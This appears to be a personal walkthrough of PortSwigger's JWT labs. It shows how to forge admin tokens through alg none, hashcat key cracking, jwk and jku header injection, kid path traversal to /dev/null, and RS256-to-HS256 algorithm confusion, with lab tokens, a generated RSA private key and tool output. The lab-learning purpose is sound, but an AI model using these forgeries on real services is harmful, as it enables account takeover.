**JWT authentication bypass via unverified signature**

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature> 

Easy unprofessional way
Editing using token.dev
 
Change payload to administrator 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/07604e08-e43d-48e6-9ec1-6703bfecbe4b)




Use burpe to decode the base64 in the jwt and changed the payload to sub to administrator 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/69b39847-e07d-4a7f-8f4a-f3fd9671c4a3)




We got admin panel 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cd8481e0-6ab2-4581-8fff-88e73d3461b9)


Also can use jwttool on kali

**JWT authentication bypass via flawed signature verification**

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification> 

By deleting the signature and setting algorithm to none we can bypass that extra step and log in with any user 
REMEMBER TO LEAVE THE TRAILING "."
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4ff99a1e-d1e2-4927-bdec-3c56fa3a121d)



```
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTk0NzUzMzl9
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1f6439b8-0752-46df-8f7b-21c9042c9df0)




```
eyJraWQiOiI3NmE1NmY4Ni1hOWFmLTQ3ZWUtYTdkZC03MGY2NjZjMDRhOTkiLCJhbGciOiJub25lIn0=
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cb1a7c03-5be3-449f-8b80-167dc18c83a0)






**JWT authentication bypass via weak signing key**

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key> 


You can use jwtool to bruteforce but I rather use hashcat and follow the lab. 

```
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
``` 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key> 

If you're using hashcat, this outputs the JWT, followed by the secret. If everything worked correctly, this should reveal that the weak secret is secret1. 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key> 



Our jwt 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f6b6e76d-098f-4642-bbea-69ccc2fb9aed)


Base64 encode our secret
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2a39e47d-f1c3-4626-8199-1e519c5f6dfa)




• In Burp, go to the JWT Editor Keys tab and click New Symmetric Key. In the dialog, click Generate to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later. 
• Replace the generated value for the k property with the Base64-encoded secret. 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6966cae7-e6b6-472f-8029-01780a491430)










• At the bottom of the tab, click Sign, then select the key that you generated in the previous section. 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key> 

• Make sure that the Don't modify header option is selected, then click OK. The modified token is now signed with the correct signature. 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d046809f-fbd4-48d4-93d7-24126dafe923)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6144b39d-c6be-436e-93c6-366bdb53c665)









Deleted 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5449699b-dca7-470c-afd1-8aea79145766)



**JWT authentication bypass via jwk header injection**

From <https://0a4400ea04f5587b813cf280008b00b0.web-security-academy.net/> 

Login and generate new RSA key

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2c8fcd04-4783-40bf-ac26-04fa5ba389a7)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6f0ea788-1a59-4401-9de0-0f46772a5de4)







• At the bottom of the JSON Web Token tab, click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key and click OK. 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/39bf8beb-b1eb-4264-aca1-4e61b7edc765)




**JWT authentication bypass via jku header injection**

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection> 

Log in 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/25a4409d-8786-45b6-abf2-e4659162c17a)



Generate RSA key 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/67072de7-7a29-4d73-b1f1-49ea9149ed07)




```
688ca6b2-f76c-440e-bbab-5754c7aa3de7
```



Paste the JWK into the keys array on the exploit server, then store the exploit. The result should look something like this: 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection> 


```
{
    "keys": [
        {
    "p": "8WTw_r61tZqbX_rgQk_-bQL_x4njuTyouAsEeniZ3Suc6kNK8SYYTzBUWVoUoBHlPJRxmfly7MS9PyxMOx3JOoyYNK1bv-PNm4F3Sip3bsQN68csyMxGI1zLsJxvn6n25e15JBdq-BvvDdwr6a93YRTWb05p0R-HkENBr7opXB8",
    "kty": "RSA",
    "q": "8UtN5ptr5njiOe3moEUfuC636P6XiqvEm7-aqCJ5OxegpQ3-14ATggx8zdWRV7iYSOnNxZWJuJqd__bHpRrxJX-WGWaULTu6qJXUovAnSZAS610QRExOj5DwQFf3Ge_DEWlNPO25smoS711G2M5IpYMohMelsHylH_KNblYkYj0",
    "d": "DC_CBdJR2JhuBeYQlDU0DKuwWcwby-rtjx0qzN_2EbPTu1dH6Qn3yW9CrHnGZNEheXag0-MtWH4dwMWR7cQS_ZHvDEN65ciFSLi3_9GBCZtlgzfC24OvzQW2SU6gu1vm-bWVnTIAQlMKLSud6gLl_K_O7vuMjDuv4eb8hrNx84ZoOqqj8BZ1UKM-lcFhFt0BMjP0rrNe4GAekoS93HcSzw8YGk7DUY3NWUqH9TEfqkCjoEmBfm0KD85LkAZx2m8dZrOBrkNieB4UywwxBuTelDk-WHvQXeTHZsrSKlXLMkopJjWJfKBbUv59YTRPLqvsUmAxbUg3V70A4PKuW35zxQ",
    "e": "AQAB",
    "kid": "688ca6b2-f76c-440e-bbab-5754c7aa3de7",
    "qi": "QEZaL0v6a6j0YjQXZIPwc9u82TRzyoYLNeM-0wl87gdzAiLq-AF9sGBcZtPuq2GFcPJZRFfbyWaTpMWdSMYx8TMn7X63zRmWklM4_IrDtAECGe1j807uHqqVyUO1z04fuorcnSmoXTnSEeNrD0NyVZnkh5KxJlMucOinNwLmfEw",
    "dp": "ogAKNAwsylmd2IX3Jsmkh-gxW-pQJ6pr2Eeck8yIBgQU5KqQitH0EoDuuqBXoy0fWM6OhrT_yaInF1RVPH864s4j_4YwQtFQ1QHH2sAxMubkKM2cYo2krGrEUBxMVSytg5UhbXVB1ox4nCacWdHmHgLr_frzzOKKCej5FkOrKiU",
    "dq": "eX33HVPIQmU_UvesFap4TB6JzzDRUKsn9VvGHT4uWEiPREwFsq_0IpjzBhiwc8CoPJ4sU331uBNx1n2FDGbCYKUbCHMTzKq0U0oNpHTS80EtpYBYPmtFaxgJP_yKmG6Wg1_H2hPAWkr6ebc3gtZq0Zt2fVSg4noAElPoTlPlQek",
    "n": "44cI5zvl79xkitglttssaRAKfDu7N-7QF96s1jhBl3Z-_mwpwpgujFzLtJ-CX9OeBn-OFEkKcP3rJ5k4Qj3Tr0gi6qeFhyzPW5MDA4A5_MqeZY80HkDo7Xy08NcFeVgxCwxNR4LVSBJKNLvyYxZ6W1MgzvgK3HFiI5njNiYAn3q3w5wJAA9yvgK0TgL2f-mSgWJCY5KGcCOcsfKBmg3Ty9Ym0o6rkWPDYJNA7lnC4bL0ZhIJWFa0B9HOPRk7iWmP2aeMOTg6Ly9GQHg8kpu-WiXPVXJWIovisU1C-dOMn9eWQSDXlcCGPYXJC_V9K3ojMZUYxfvBrlQAPKc4j3rRYw"
        }
    ]
}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5bb97b28-83f9-4b0c-b653-7b0438557fca)



Sign our request and change the header to include our jku to exploit server 
And the sub to administrator

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bc285140-a60e-48db-9fc4-2e10f23ee55c)



We can now go to the administrator panel and delete the user we wanted 




**JWT authentication bypass via kid header path traversal**

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal> 


Login 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/954f8ef3-80c8-44e5-9895-8fc607497a47)




Using jwt extension generate a New Symmetric key with a 
Base64-encoded null byte 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal> 
this is just a workaround because the JWT Editor extension won't allow you to sign tokens using an empty string. 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a127d7df-cbfe-443f-9d92-eb1518d96b47)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a5adf448-3b26-4a72-b53e-6f8dad1b7282)














Change our request to /admin and change our kid parameter to 

```
../../../../../../../dev/null
``` 

From <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal> 

And sub
Administrator
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/926174bc-8a20-49ad-9b52-8cabf3786a23)



Sign and send
We have access to admin panel now
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1507a87a-b286-426e-b46d-074a029162e8)



**JWT authentication bypass via algorithm confusion**

From <https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion> 
https://0a8b0082036c789b8d244e4400460054.web-security-academy.net/jwks.json

Leaked 
JWK Set containing a single public key. 

From <https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/eea175e4-5025-4021-95cf-691b74607736)



```
{"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"2700ea63-7b68-408b-96cf-93ddec8ea5b0","alg":"RS256","n":"nw__48y77GRFvMY9M3Y2ddkoQduYprd4iJ_0wKP-KmSapmz4u8oAKOTNFpWP8WoBdmUKn-bd0OYQDXEheOYhWz4Qd7Fz61iAeBh27yhY50FBlwbwC9Uw5l98lWx-wyPPl4SNza70LeQClIoo_WfzSyGFxKcgZ1QgUkcF2KM0EJcCVab8XceTDhNtyoOSKHdQfS0gGz9cjN-KanzLaP1YDao-TfYjH9LgqrF_WWs09IcG_aZTtG6NRgBuORbT2zcMqTeEBCtj_wdxw_ZapvKODpmaes52f-K-dl42NR7xVDTd1qTM168sqR1qoICnyPrrQaPXpwtb_nhHyAOXnSIZWw"}]}
```

From <https://0a8b0082036c789b8d244e4400460054.web-security-academy.net/jwks.json> 



Only care about this 
```
{"kty":"RSA","e":"AQAB","use":"sig","kid":"2700ea63-7b68-408b-96cf-93ddec8ea5b0","alg":"RS256","n":"nw__48y77GRFvMY9M3Y2ddkoQduYprd4iJ_0wKP-KmSapmz4u8oAKOTNFpWP8WoBdmUKn-bd0OYQDXEheOYhWz4Qd7Fz61iAeBh27yhY50FBlwbwC9Uw5l98lWx-wyPPl4SNza70LeQClIoo_WfzSyGFxKcgZ1QgUkcF2KM0EJcCVab8XceTDhNtyoOSKHdQfS0gGz9cjN-KanzLaP1YDao-TfYjH9LgqrF_WWs09IcG_aZTtG6NRgBuORbT2zcMqTeEBCtj_wdxw_ZapvKODpmaes52f-K-dl42NR7xVDTd1qTM168sqR1qoICnyPrrQaPXpwtb_nhHyAOXnSIZWw"}
```

From <https://0a8b0082036c789b8d244e4400460054.web-security-academy.net/jwks.json> 


Create new rsa key using jwt editor
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7f5a085f-77a4-4a82-a142-ad028d281e1a)

Get copy of key by choosing pem option 
Click ok
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/09fbe6ed-fb59-4d7c-b761-69b694cde6e7)

Encode as base64
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0ad2bb7a-ed16-4465-956e-b7654d7bebf5)




```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFudy8vNDh5NzdHUkZ2TVk5TTNZMgpkZGtvUWR1WXByZDRpSi8wd0tQK0ttU2FwbXo0dThvQUtPVE5GcFdQOFdvQmRtVUtuK2JkME9ZUURYRWhlT1loCld6NFFkN0Z6NjFpQWVCaDI3eWhZNTBGQmx3YndDOVV3NWw5OGxXeCt3eVBQbDRTTnphNzBMZVFDbElvby9XZnoKU3lHRnhLY2daMVFnVWtjRjJLTTBFSmNDVmFiOFhjZVREaE50eW9PU0tIZFFmUzBnR3o5Y2pOK0thbnpMYVAxWQpEYW8rVGZZakg5TGdxckYvV1dzMDlJY0cvYVpUdEc2TlJnQnVPUmJUMnpjTXFUZUVCQ3RqL3dkeHcvWmFwdktPCkRwbWFlczUyZitLK2RsNDJOUjd4VkRUZDFxVE0xNjhzcVIxcW9JQ255UHJyUWFQWHB3dGIvbmhIeUFPWG5TSVoKV3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```



Create random symmetric key in jwt
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9847f7ff-7718-476a-aad0-286be0d0e6ee)




Replace k parameter with and click ok
```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFudy8vNDh5NzdHUkZ2TVk5TTNZMgpkZGtvUWR1WXByZDRpSi8wd0tQK0ttU2FwbXo0dThvQUtPVE5GcFdQOFdvQmRtVUtuK2JkME9ZUURYRWhlT1loCld6NFFkN0Z6NjFpQWVCaDI3eWhZNTBGQmx3YndDOVV3NWw5OGxXeCt3eVBQbDRTTnphNzBMZVFDbElvby9XZnoKU3lHRnhLY2daMVFnVWtjRjJLTTBFSmNDVmFiOFhjZVREaE50eW9PU0tIZFFmUzBnR3o5Y2pOK0thbnpMYVAxWQpEYW8rVGZZakg5TGdxckYvV1dzMDlJY0cvYVpUdEc2TlJnQnVPUmJUMnpjTXFUZUVCQ3RqL3dkeHcvWmFwdktPCkRwbWFlczUyZitLK2RsNDJOUjd4VkRUZDFxVE0xNjhzcVIxcW9JQ255UHJyUWFQWHB3dGIvbmhIeUFPWG5TSVoKV3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/acde52bb-e71d-4a8e-ae76-047e13313486)






Login with standard and go to home page and send to repeater
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9561ea17-5fb5-41cc-bf31-76525cfbe5ca)



Change alg to hs256
Change sub to administrator 
Sign it 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bf8fed58-d931-4dbe-81ca-6bb432c23827)




Send and we now have admin panel
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/73bf8a22-8e06-45cd-b7cf-76e110ae7fbe)


**JWT authentication bypass via algorithm confusion with no exposed key**

From <https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key> 


Log in to get two jwt token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/85085c5b-ceed-4ae8-aa65-1d9c0c9a8071)


Log out and log in again to get our second jwt 

```
eyJraWQiOiJjOTIxNWMyZC1hNjMwLTRkNDgtODAyYi04ZTBmMTA2YTc0ODMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5OTYzNjgzMH0.rwfLSDXgvKd8izHWdpFA5UZC7nhAO5z8pQgaeLd-3clqVGymzHsaLkqfQ31MZYumGjeIbZb766_Dy6gwlM7yXQjpcztS6Gqr6HyOgRbAA_Ah4k6Sl7DcIIqI07W7AyaCm0p6E3zsE9tZS5HzwFdR1bMsQcKlvncFUZ7c44G593CqkIGPBtyFLH8orTw-He65aiJV7Y5ztqcbeSzSH3WjpnvrX7LZA81ww95XjfpXGlXiy16v0mivQg80BRPlWl96adFNfghznooaowoCHoIN7O3VEPViPCj0ZyZApD1aIBEBu3WG7sngB2-kdRqfAFUIAHK0f_Kk8Epiy64Zd09ZRg
```

```
eyJraWQiOiJjOTIxNWMyZC1hNjMwLTRkNDgtODAyYi04ZTBmMTA2YTc0ODMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5OTYzNjkyM30.fkQZIH2w6evXvy0wtHVplkOkNgC4njZQajla-E3CAdgyGC3jV1IYgcPqvHDUf2-trs1ajcH0_w8RDH4NXr84uEP8sRUWh73r13-g-gNH12lfOEpjDHcPy4x1VvM9bOONaIsB3jL2vzeUxDR5jd9FoxdVC0k2Fh9pfjkVCTx1WrvFjW5RKklN3r_HUTOisiDZz7h8z9ZHowy-XSP_1Q2j47IFuMwSGKCGPeeGZn_iLktHV_A4lPj3uFlKlHlxrYtjZFybh7f1kNlOyog366xy8tyTiPF291S-byc_F49CpN8dUfDaZuExzPY90fGIHCkoyjNW3iQPX9aEu9oQc6HDoQ
```


Using jwt exploit provided by port swigger
```
https://github.com/silentsignal/rsa_sign2n
```

```
sudo docker run --rm -it portswigger/sig2n  eyJraWQiOiJjOTIxNWMyZC1hNjMwLTRkNDgtODAyYi04ZTBmMTA2YTc0ODMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5OTYzNjgzMH0.rwfLSDXgvKd8izHWdpFA5UZC7nhAO5z8pQgaeLd-3clqVGymzHsaLkqfQ31MZYumGjeIbZb766_Dy6gwlM7yXQjpcztS6Gqr6HyOgRbAA_Ah4k6Sl7DcIIqI07W7AyaCm0p6E3zsE9tZS5HzwFdR1bMsQcKlvncFUZ7c44G593CqkIGPBtyFLH8orTw-He65aiJV7Y5ztqcbeSzSH3WjpnvrX7LZA81ww95XjfpXGlXiy16v0mivQg80BRPlWl96adFNfghznooaowoCHoIN7O3VEPViPCj0ZyZApD1aIBEBu3WG7sngB2-kdRqfAFUIAHK0f_Kk8Epiy64Zd09ZRg eyJraWQiOiJjOTIxNWMyZC1hNjMwLTRkNDgtODAyYi04ZTBmMTA2YTc0ODMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5OTYzNjkyM30.fkQZIH2w6evXvy0wtHVplkOkNgC4njZQajla-E3CAdgyGC3jV1IYgcPqvHDUf2-trs1ajcH0_w8RDH4NXr84uEP8sRUWh73r13-g-gNH12lfOEpjDHcPy4x1VvM9bOONaIsB3jL2vzeUxDR5jd9FoxdVC0k2Fh9pfjkVCTx1WrvFjW5RKklN3r_HUTOisiDZz7h8z9ZHowy-XSP_1Q2j47IFuMwSGKCGPeeGZn_iLktHV_A4lPj3uFlKlHlxrYtjZFybh7f1kNlOyog366xy8tyTiPF291S-byc_F49CpN8dUfDaZuExzPY90fGIHCkoyjNW3iQPX9aEu9oQc6HDoQ
```
Running command: python3 jwt_forgery.py <token1> <token2>


Found n with multiplier 1:
 ```
Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF0ZlRWTEhWQUZqSjlaWFd3bFAwRApMQVFVMGg1am91Rm1ZVHZQbGhDWndmMElBUldZekRicWYvVVpXUzNlNHUxVFBLUnR2b2FwTkdrR3pSY21VTjV5ClRkdVlUUStxbXkyWGVTNDRhR0F2UW5rdWRKYzdJamg2NlZqUU5Nc0phai96WEIvaFFRanhjVXpmTVRCYXZLNE4KSmthWk5xdXZyTVdTbHI4TGsyQWxHQllYU3VQYThhMExJekE5RjNxaU5RWHRxRnlkYWg5TS9iM05CaHordDV6cApYR1FHcC9rL2NkWkt1WWo1TTRadE56T1J6b09qZ05EYWNCTVpETGE1RzRLN3pxTHZtQmo0Nklib0grYkhKaWdpCmdqNkpPMFZQRmFoejBsZ04ydlk1L2d5YXUyZUw5cVBIazRtRlhmZGt2bS9NSzRrU2YwZ1UrWUR3MVJpM0FVNUEKbndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiJjOTIxNWMyZC1hNjMwLTRkNDgtODAyYi04ZTBmMTA2YTc0ODMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjk5NzIwMTIyfQ.JOkBX7MJ8x7UFPGDFin1-Bmz7BPXpkFXyzkOo1jJe6U
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXRmVFZMSFZBRmpKOVpYV3dsUDBETEFRVTBoNWpvdUZtWVR2UGxoQ1p3ZjBJQVJXWXpEYnEKZi9VWldTM2U0dTFUUEtSdHZvYXBOR2tHelJjbVVONXlUZHVZVFErcW15MlhlUzQ0YUdBdlFua3VkSmM3SWpoNgo2VmpRTk1zSmFqL3pYQi9oUVFqeGNVemZNVEJhdks0TkprYVpOcXV2ck1XU2xyOExrMkFsR0JZWFN1UGE4YTBMCkl6QTlGM3FpTlFYdHFGeWRhaDlNL2IzTkJoeit0NXpwWEdRR3Avay9jZFpLdVlqNU00WnROek9Sem9PamdORGEKY0JNWkRMYTVHNEs3enFMdm1CajQ2SWJvSCtiSEppZ2lnajZKTzBWUEZhaHowbGdOMnZZNS9neWF1MmVMOXFQSAprNG1GWGZka3ZtL01LNGtTZjBnVStZRHcxUmkzQVU1QW53SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiJjOTIxNWMyZC1hNjMwLTRkNDgtODAyYi04ZTBmMTA2YTc0ODMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjk5NzIwMTIyfQ.-2yjVGQLCYJ-MyFr3l9TAxjdghXk4HaApCdHSexWXEc
```


We will be using the x509 key
Make new symmetric key
Replace k with x509 key
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/54aa66af-c0e1-4004-89b2-f3cf4e2c5c03)



Rplace alg to hs256
Sub to administrator and sign and send
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/01857233-1b13-4813-9928-2c1fdc38427f)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5549b8c0-50eb-4455-b147-16ed3303a3cb)





